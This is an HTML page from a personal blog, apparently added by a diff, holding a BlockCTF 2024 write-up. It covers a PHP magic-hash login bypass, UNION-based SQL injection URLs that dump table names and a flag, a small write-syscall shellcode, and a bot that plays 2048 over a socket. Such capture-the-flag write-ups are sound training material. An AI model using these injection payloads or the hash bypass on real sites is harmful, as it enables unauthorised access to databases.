@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=56163&amp;path=livereload" data-no-instant defer></script><title>BlockCTF 2024 - writeup &ndash; TheMrEviil Blog</title>
+<meta name="description" content="![my image](/post/my_image.png)">
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="http://localhost:56163/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="http://localhost:56163/css/risotto.css">
+<link rel="stylesheet" href="http://localhost:56163/css/custom.css">
+
+
+
+
+
+
+
+
+<link rel="alternate" type="application/rss+xml" href="http://localhost:56163/post/blockctf2024/index.xml" title="TheMrEviil Blog">
+</head>
+
+    <body>
+        <div class="page">
+
+            <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+    <h1 class="page__logo"><a href="http://localhost:56163/" class="page__logo-inner">TheMrEviil Blog</a></h1>
+    
+    
+    <li class="main-nav__item"><a class="nav-main-item" href="http://localhost:56163/categories/writeups" title="">Writeups</a></li>
+    
+    <li class="main-nav__item"><a class="nav-main-item active" href="http://localhost:56163/post/" title="Posts">Posts</a></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+            <section class="page__body">
+    <header class="content__header">
+        <h1>BlockCTF 2024 - writeup</h1>
+        <h2 id="web-juggl3r">WEB: Juggl3r</h2>
+<p>Description:</p>
+<pre tabindex="0"><code>Juggl3r
+200
+The admin panel seems locked behind some odd logic, and the flag is hidden deep. Can you bypass the checks and uncover the secret?
+
+http://54.85.45.101:8080/
+</code></pre><p>This challange remember me why i lovd PHP and the same i hate it. When we go on website we have only login page with attempt 5 minut.
+In requests we find version PHP and Apache. Well&hellip; lets mix some params in request. When we set username <code>admin</code> and  <code>password[]=1</code> server response `` Warning: hash() expects parameter 2 to be string, array given in /var/www/html/login.php on line 36`</p>
+<p>This information give a lot of things + challange name Juggl3r. In PHP 7.4 we have some thing like type juggling. It&rsquo;s not good logic to equal variables example:
+&lsquo;123&rsquo; == 123 : TRUE</p>
+<p>but in warning we have information about <code>hash()</code> function let&rsquo;s check magic hash. Concept takes advantage of this behavior by using special strings that, when compared to each other with ==, are evaluated as equal to each other (even though they may seem different). In particular, it uses strings that PHP will interpret as a number 0 during comparison.</p>
+<p>For example:</p>
+<p>&ldquo;0e12345&rdquo; == &ldquo;0&rdquo; is true because &ldquo;0e12345&rdquo; is interpreted as 0.</p>
+<p>Popular hashes in PHP are MD5, SHA256</p>
+<p>SHA256:
+<code>34250003024812:0e46289032038065916139621039085883773413820991920706299695051332</code></p>
+<p>and we got admin.
+Next step in url we can change user_id parameter. but not interesting, but when i add &ndash; we have SQL Syntax ERROR . AWESOME</p>
+<p>now we add a little bit SQL
+<code>http://54.85.45.101:8080/admin.php?user_id=NULL%20union%20select%201,%20table_name,%201%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%2083--</code></p>
+<p>and set user_id=NULL because we need spot to display query result. When we have table name <code>flags</code> get column name</p>
+<p><code>http://54.85.45.101:8080/admin.php?user_id=NULL union select 1, COLUMN_NAME, 1 FROM information_schema.columns WHERE table_name = 'flags' LIMIT 1 OFFSET 0--</code></p>
+<p>now we can read flag
+<code>http://54.85.45.101:8080/admin.php?user_id=NULL union select 1, flag, 1 FROM flags WHERE id = 1--</code></p>
+<p>and gg <code>flag{juggl3_inject}</code></p>
+<h2 id="pwn-only-ws">PWN: Only Ws</h2>
+<p>Description:</p>
+<pre tabindex="0"><code>Only Ws
+50
+The flag is write there. All you have to do is get it.
+
+nc 54.85.45.101 8005
+</code></pre><p>When we connect to netcat we have flag address. Write some asm with the best friend ChatGPT</p>
+<pre tabindex="0"><code>from pwn import asm, context
+
+context.arch = &#39;amd64&#39;
+
+shellcode = asm(&#34;&#34;&#34;
+    mov rax, 1
+    mov rdi, 1
+    mov rsi, 0x4040a0
+    mov rdx, 64
+    syscall
+    mov rax, 60
+    xor rdi, rdi
+    syscall
+&#34;&#34;&#34;)
+
+with open(&#34;payload1&#34;, &#39;wb&#39;) as f:
+    f.write(shellcode)
+print(shellcode)
+</code></pre><p>ok, now we can send a payload to nc and get flag
+<code>flag{kinda_like_orw_but_only_ws}</code></p>
+<h2 id="misc-2048-ai">MISC: 2048 ai</h2>
+<p>Description:</p>
+<pre tabindex="0"><code>2048 ai
+150
+Can you speedrun 2048?
+
+nc 54.85.45.101 8006
+</code></pre><p>Code:</p>
+<pre tabindex="0"><code>import time
+import sys
+import ctypes
+import math
+import os
+import random
+import pwn
+from pwn import cyclic_find
+
+pwn.context.log_level = &#39;debug&#39;
+
+def to_c_board(m):
+    board = 0
+    i = 0
+    for row in m:
+        for c in row:
+            board |= int(round(math.log(c, 2))) &lt;&lt; (4 * i) if c &gt; 0 else 0
+            i += 1
+    return board
+
+def movename(move):
+    return [&#39;w&#39;, &#39;s&#39;, &#39;a&#39;, &#39;d&#39;][move]
+
+def find_best_move_for_4x4(board):
+    if len(board) != 4 or any(len(row) != 4 for row in board):
+        raise ValueError(&#34;Input must be a 4x4 matrix.&#34;)
+    
+    c_board = to_c_board(board)
+    move = ailib.find_best_move(c_board)
+
+    if move &lt; 0:
+        return &#34;No moves available&#34;
+    return movename(move)
+
+def parse_board_state(response):
+    board_state = []
+    lines = response.splitlines()[1:]
+    for line in lines[:4]:  # Process only the first 4 lines for rows
+        row = [int(x) for x in line.split() if x.isdigit()]
+        # Pad row with zeros if less than 4 elements
+        while len(row) &lt; 4:
+            row.append(0)
+        board_state.append(row)
+
+    while len(board_state) &lt; 4:
+        board_state.append([0, 0, 0, 0])
+    
+    return board_state
+
+# Initializing the AI library
+for suffix in [&#39;so&#39;, &#39;dll&#39;, &#39;dylib&#39;]:
+    dllfn = &#39;2048-ai/bin/2048.&#39; + suffix
+    if os.path.isfile(dllfn):
+        ailib = ctypes.CDLL(dllfn)
+        break
+else:
+    print(&#34;Couldn&#39;t find 2048 library bin/2048.{so,dll,dylib}! Make sure to build it first.&#34;)
+    sys.exit()
+
+ailib.init_tables()
+ailib.find_best_move.argtypes = [ctypes.c_uint64]
+
+# Example board state
+board_state = [
+    [0, 0, 0, 0],
+    [2, 0, 0, 0],
+    [2, 0, 0, 0],
+    [0, 0, 0, 0]
+]
+
+
+p = pwn.remote(&#39;54.85.45.101&#39;,8006)
+
+last_moves = []
+while True:
+    response = p.recvuntil(b&#34;Enter command(s) (w/a/s/d for movement, q to quit):&#34;, timeout=3).decode(&#34;UTF-8&#34;)
+    
+    
+    if &#34;Congratulations&#34; in response or &#34;Over&#34; in response:
+        print(response)
+        sys.exit()
+    
+    board_state = parse_board_state(response)
+    print(&#34;Stan planszy:&#34;, board_state)  
+    
+    move = find_best_move_for_4x4(board_state)
+    print(&#39;move&#39;, move)
+    if move == &#34;No moves available&#34;:
+        print(&#34;No valid moves left. Exiting.&#34;)
+        sys.exit()
+    
+    last_moves.append(move)
+    p.sendline(move.encode(&#39;utf-8&#39;))
+</code></pre><p>And we have <code>flag{f4st3r_th4n_hum4nly_p0ssibl3}</code></p>
+<p>We finish CTF on #19 :)</p>
+<p>Bye</p>
+
+    </header>
+
+    
+
+            </section>
+
+            <section class="page__aside">
+                <div class="aside__about">
+<div class="aside__about">
+    
+<h1 class="about__title">Jakub Przepióra</h1>
+<p class="about__description"><img src="/post/my_image.png" alt="my image"></p>
+</div>
+
+
+<ul class="aside__social-links">
+    
+    <li>
+        <a href="https://github.com/jakub-przepiora" rel="me" aria-label="GitHub" title="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="mailto:jakub.przepioraa@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://www.linkedin.com/in/jakub-przepiora/" rel="me" aria-label="Linkedin" title="Linkedin"><i class="fa-brands fa-linkedin" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://discord.com/users/295690522146897920" rel="me" aria-label="Linkedin" title="Linkedin"><i class="fa-brands fa-discord" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="https://www.youtube.com/@jakubprzepiora" rel="me" aria-label="Youtube" title="Youtube"><i class="fa-brands fa-youtube" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+    <li>
+        <a href="/index.xml" rel="me" aria-label="RSS" title="RSS"><i class="fa-solid fa-rss" aria-hidden="true"></i></a>&nbsp;
+    </li>
+    
+</ul>
+</div>
+                <hr>
+                <div class="aside__content">
+    
+
+                </div>
+            </section>
+
+            <footer class="page__footer"><p>
+    
+    
+    
+    
+    
+    
+      
+    
+      
+    
+    
+    
+      
+      
+          
+            
+            
+                
+
+            
+          
+      
+    
+</p>
+<br /><br />
+</footer>
+
+        </div>
+    </body>
+
+</html>
